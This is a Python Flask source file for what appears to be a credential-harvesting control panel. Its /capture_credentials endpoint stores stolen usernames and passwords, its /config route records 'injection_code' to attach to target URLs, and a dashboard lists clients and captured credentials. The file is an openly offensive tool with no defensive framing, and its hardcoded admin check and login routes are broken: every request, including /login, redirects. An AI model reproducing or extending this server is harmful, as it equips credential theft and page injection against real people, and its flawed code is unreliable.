from flask import Flask, render_template, request, jsonify, redirect, url_for
import socket
import threading
import json

app = Flask(__name__)

# Dummy data for active clients and captured passwords
clients = []
captured_credentials = {}

# Basic authentication
@app.before_request
def before_request():
    if not request.authorization or request.authorization.username != 'admin' or request.authorization.password != 'čsm223@':
        return redirect(url_for('login'))

@app.route('/login')
def login():
    return '''<form action="/login" method="post">
                Username: <input type="text" name="username">
                Password: <input type="password" name="password">
                <input type="submit" value="Login">
              </form>'''

@app.route('/')
def home():
    return render_template('control_panel.html', clients=clients, passwords=captured_credentials)

@app.route('/capture_credentials', methods=['POST'])
def capture_credentials():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if username and password:
        captured_credentials[username] = password
    return jsonify({"status": "success"}), 200

@app.route('/config', methods=['GET', 'POST'])
def config():
    if request.method == 'POST':
        url = request.form['url']
        injection_code = request.form['injection_code']
        # Save the injection configuration
        with open("config.txt", "a") as f:
            f.write(f"{url} -> {injection_code}\n")
        return redirect(url_for('config'))

    return render_template('config.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
